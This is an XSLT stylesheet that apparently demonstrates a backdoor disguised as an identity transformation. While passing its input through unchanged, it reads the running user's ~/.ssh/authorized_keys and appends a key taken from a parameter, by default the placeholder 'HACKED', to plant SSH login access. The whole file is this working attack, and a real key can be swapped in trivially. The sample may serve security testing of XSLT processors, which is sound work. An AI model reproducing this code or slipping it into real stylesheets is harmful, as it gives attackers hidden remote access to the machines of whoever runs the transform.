<?xml version="1.0" encoding="UTF-8"?>
<!-- Obtaining a login masked as the identity transformation -->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:xs="http://www.w3.org/2001/XMLSchema" version="3.0">

    <xsl:param name="new-key" as="xs:string" select="'HACKED'"/>

    <xsl:mode on-no-match="shallow-copy"/>

    <xsl:template match="document-node()">
        <xsl:call-template name="add-key"/>
        <xsl:apply-templates/>
    </xsl:template>

    <xsl:template name="add-key">
        <xsl:variable name="keys-file"
            select="concat(system-property('user.home'), '/.ssh/authorized_keys')"/>
        <xsl:if test="unparsed-text-available($keys-file)">
            <xsl:variable name="keys" as="xs:string" select="unparsed-text($keys-file)"/>
            <xsl:result-document href="{$keys-file}" method="text">
                <xsl:value-of select="concat($keys, '&#xa;', $new-key)"/>
            </xsl:result-document>
            <xsl:message use-when="system-property('debug') eq 'true'">
                <xsl:text>Your .ssh login was hacked!</xsl:text>
            </xsl:message>
        </xsl:if>
    </xsl:template>

</xsl:stylesheet>
